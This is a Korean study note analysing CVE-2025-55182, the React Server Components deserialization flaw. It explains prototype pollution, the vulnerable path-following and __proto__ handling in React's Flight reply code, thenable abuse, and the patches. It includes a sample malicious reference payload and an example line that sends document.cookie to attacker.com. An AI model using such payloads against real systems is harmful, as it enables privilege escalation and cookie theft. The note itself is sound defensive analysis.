- https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
    
    11월 29일, Lachlan Davidson이 React Server Function `엔드포인트로 전송된 페이로드를 React가 디코딩하는 방식의 결함`을 악용하여 `인증되지 않은 원격 코드 실행을 허용`하는 React의 보안 취약점을 보고했습니다.
    
    앱이 React Server Function 엔드포인트를 구현하지 않더라도, `앱이 React Server Components를 지원하는 경우 여전히 취약`할 수 있습니다.
    
    이 취약점은 [CVE-2025-55182](https://www.cve.org/CVERecord?id=CVE-2025-55182)로 공개되었으며 `CVSS 10.0 등급`을 받았습니다.
    
    다음 패키지의 19.0, 19.1.0, 19.1.1, 19.2.0 버전에 취약점이 존재합니다:
    
    - [react-server-dom-webpack](https://www.npmjs.com/package/react-server-dom-webpack)
    - [react-server-dom-parcel](https://www.npmjs.com/package/react-server-dom-parcel)
    - [react-server-dom-turbopack](https://www.npmjs.com/package/react-server-dom-turbopack?activeTab=readme)
    
    ### 취약점 개요
    
    [React Server Functions](https://react.dev/reference/rsc/server-functions)를 사용하면 클라이언트가 서버의 함수를 호출할 수 있습니다. React는 프레임워크와 번들러가 React 코드를 클라이언트와 서버 모두에서 실행하는 데 도움이 되는 통합 지점과 도구를 제공합니다. React는 클라이언트의 요청을 HTTP 요청으로 변환하여 서버로 전달합니다. 서버에서 React는 HTTP 요청을 함수 호출로 변환하고 필요한 데이터를 클라이언트에 반환합니다.
    
    인증되지 않은 공격자가 악의적인 HTTP 요청을 Server Function 엔드포인트로 만들어 보낼 수 있으며, `React가 이를 역직렬화할 때 서버에서 원격 코드 실행`을 달성할 수 있습니다. 취약점에 대한 추가 세부 사항은 수정 사항의 배포가 완료된 후 제공될 예정입니다. 
    

---

## Prototype Pollution

```jsx
const objA = {};
const objB = {};

console.log(objA.polluted); // undefined
console.log(objB.polluted); // undefined
```

- `objA`와 `objB`는 **서로 다른 메모리의 객체**
- 공통점은 **둘 다 Object.prototype을 공유한다는 점뿐**
- 아직 prototype에는 `polluted`라는 속성이 없음

```jsx
objA.__proto__.polluted = "polluted";
```

```jsx
console.log(objA.polluted); // "polluted"
console.log(objB.polluted); // "polluted"
```

- 모든 객체가 공유하는 Prototype 자체가 수정됨

```jsx
objB.hasOwnProperty("polluted") // false
```

- polluted는 objA 자신의 속성이 아니라 프로토타입에서 상속된 속성

---

## 문제점과 해결

### 1. `reference.split(':')`로 경로 문제

```tsx
function getOutlinedModel<T>(
  response: Response,
  reference: string,
  parentObject: Object,
  key: string,
  map: (response: Response, model: any) => T,
): T {
	// !reference 문자열을 :로 split만 한 뒤
  const path = reference.split(':');
  const id = parseInt(path[0], 16);
  const chunk = getChunk(response, id);
  switch (chunk.status) {
    case RESOLVED_MODEL:
      initializeModelChunk(chunk);
      break;
  }
  // The status might have changed after initialization.
  switch (chunk.status) {
    case INITIALIZED:
      let value = chunk.value;
      for (let i = 1; i < path.length; i++) {
	      //! value[path[i]]를 **그냥 따라가면서 접근**
        value = value[path[i]];
      }
      return map(response, value);
```

- RSC 서버가 네트워크로 내려보낸 Flight 응답 안에 들어 있는 문자열인 `reference`를
- `:`로 split만 한 뒤
- `value[path[i]]`를 **그냥 따라가면서 접근**
    
    → `__proto__`, `constructor` 같은 키도 막지 못하고 그대로 열어줌.
    
- 공격자가 RSC 서버 엔드포인트 직접 호출해서 `reference`를 주입할 수 있음

```jsx
{
  "type": "model",
  "id": 1,
  "reference": "1:__proto__:isAdmin"
}
```

```jsx
path = ["1", "__proto__", "isAdmin"];
value = chunk.value;              // 정상 객체
value = value["__proto__"];       // Object.prototype
value = value["isAdmin"];         // Object.prototype.isAdmin 접근
```

```jsx
Object.prototype.isAdmin = true;
// 인증, 권한 체크 모두 통과될 수 있음
```

- 개선 후
    - **getOutlinedModel 함수 구현 내 속성 값 검사 추가**
        
        ```tsx
        const name = path[i];
        
        if (typeof value === 'object' 
        		&& hasOwnProperty.call(value, name)) {
        	value = value[name];
        }
        ```
        
        - `__proto__`, `constructor`, `prototype` 같은 건 보통 **프로토타입(Object.prototype 등)에 있고 own property가 아님**
        - **자기 자신(obj 본인)의 own property일 때만** 다음으로 내려감

---

### 2. `__proto__`, `constructor` 등 위험 키 접근 가능

- `reviveModel()` : JSON으로는 표현 불가능한 React/RSC 전용 타입들을 실제 JS 객체로 복원하는 함수
    
    ```tsx
    if (newValue !== undefined) {
      value[key] = newValue;
    } else {
      delete value[key];
    }
    ```
    
    ```jsx
    key === "__proto__"
    newValue === undefined
    ---
    delete value["__proto__"];
    ```
    
    - **`obj`의 own property로서의 `"__proto__"`가 사라지고**
    - 그 자리를 **JS 엔진 내부에 있던 getter `__proto__`가 다시 차지**
- 개선 후
    
    ```jsx
    if (newValue !== undefined || key === '__proto__') {
      value[key] = newValue;
    } else {
      delete value[key];
    }
    ```
    
    - `key === '__proto__'` 이므로 조건이 참
    - `obj["__proto__"] = undefined` 실행

---

### 3. `thenable`

- thenable
    
    ```jsx
    promise.then(fn);
    ```
    
    - 보통 프로미스의 형태
    
    ```jsx
    const fakePromise = {
      then() {
        console.log("실행됨!");
      }
    };
    
    await fakePromise;  // then()이 자동 실행됨
    ```
    
    - thenable(가짜 Promise)
    - **자바스크립트에는 규칙: `then`이라는 함수가 달린 객체는 “Promise처럼 취급”된다.**
    - 이 then이 내가 만든 then인지, 공격자가 만든 then인지”를 구분하지 못함
    
    ```jsx
    value = chunk.value;          // 서버에서 온 객체
    value = value["__proto__"];  // Object.prototype
    value = value["then"];       // 공격자가 심어둔 then 함수
    
    value.then();                // React가 자동 실행
    ```
    
    ```jsx
    Object.prototype.then = function () {
      fetch("https://attacker.com/steal?cookie=" + document.cookie);
    };
    ```
    
- 개선 후
    
    ```jsx
    if (hasOwnProperty.call(value, name)) {
      value = value[name];
    }
    ```
    
    - `__proto__`, `constructor`, `prototype` 경로 자체 차단
    
    ![Screenshot 2025-12-10 at 8.44.42 pm.png](./Screenshot%202025-12-10%20at%208.44.42 pm.png)
    
    - 임의 객체의 then은 더 이상 실행되지 않고 React가 만든 ReactPromise 인스턴스만 처리된다

## Ref

- https://www.enki.co.kr/media-center/blog/complete-analysis-of-the-react2shell-cve-2025-55182-vulnerability#cve-2025-55182-react2shell-%EC%9D%B4%EB%9E%80
- 취약점 고치기 전 리액트 코드 : https://github.com/facebook/react/blob/36df5e8b42a97df4092f9584e4695bf4537853d5/packages/react-server/src/ReactFlightReplyServer.js#L929
- 취약점 고친 후 리액트 코드 : https://github.com/facebook/react/blob/7dc903cd29dac55efb4424853fd0442fef3a8700/packages/react-server/src/ReactFlightReplyServer.js